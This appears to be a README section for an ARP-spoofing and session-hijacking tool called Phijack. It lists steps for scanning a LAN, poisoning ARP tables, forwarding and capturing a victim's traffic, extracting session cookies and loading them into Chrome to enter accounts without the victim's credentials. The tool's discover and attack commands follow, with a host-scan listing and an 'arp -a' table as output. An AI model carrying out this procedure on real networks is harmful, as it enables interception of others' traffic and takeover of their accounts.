- [ARP spoofing & session hijacking](https://github.com/kimdo331/2019-Police-Project)

```
1. ip scanning: find all devices in the same LAN by ip scanning
2. set target
3. arp spoofing: capture all packets from and to the target
4. ip forwarding: send all packets regarding the target to sharing server
5. tcpdump:capture all packets
6. packet analysis: Extract session and cookie
7. register the cookie in chrome browser and access the website without target's credential(uid & passwd)
```

## Phijack

```sh
F:\Phijack>python3 arp_poisoning.py discover 192.168.0.1/24
My MAC: 14:e6:e4:06:87:79
My IP: 192.168.0.6

[+] Scanning 192.168.0.1/24...
        192.168.0.6 => 14:e6:e4:06:87:79
        192.168.0.1 => 3c:06:a7:60:70:35
        192.168.0.3 => 18:f4:6a:cb:bf:6b
        192.168.0.8 => f4:ee:08:de:cd:b1
        192.168.0.10 => 48:b0:2d:88:24:b9
        192.168.0.11 => 14:c6:97:8d:2c:23
        192.168.0.15 => f4:7b:09:0d:f5:57
        192.168.0.16 => 18:4f:32:ca:70:2d
        192.168.0.2 => 28:31:66:b7:25:c3
        192.168.0.4 => 8c:1d:96:97:0a:18
        192.168.0.14 => 8c:1d:96:97:0a:18
        192.168.0.13 => 70:a8:d3:ad:b0:7e
        192.168.0.5 => 3c:86:d1:b5:80:93
        192.168.0.100 => b2:ac:d2:0f:59:10

```

```sh
$ python3 arp_poisoning.py attack 192.168.0.14 192.168.0.1
```

```sh
$ arp -a

Interface: 169.254.69.54 --- 0xb
  Internet Address      Physical Address      Type
  169.254.255.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.0.6 --- 0xf
  Internet Address      Physical Address      Type
  192.168.0.1           3c-06-a7-60-70-35     dynamic
  192.168.0.14          8c-1d-96-97-0a-18     dynamic
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 169.254.105.191 --- 0x10
  Internet Address      Physical Address      Type
  169.254.255.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

Interface: 172.25.208.1 --- 0x18
  Internet Address      Physical Address      Type
  172.25.223.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.22.160.1 --- 0x39
  Internet Address      Physical Address      Type
  172.22.175.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
```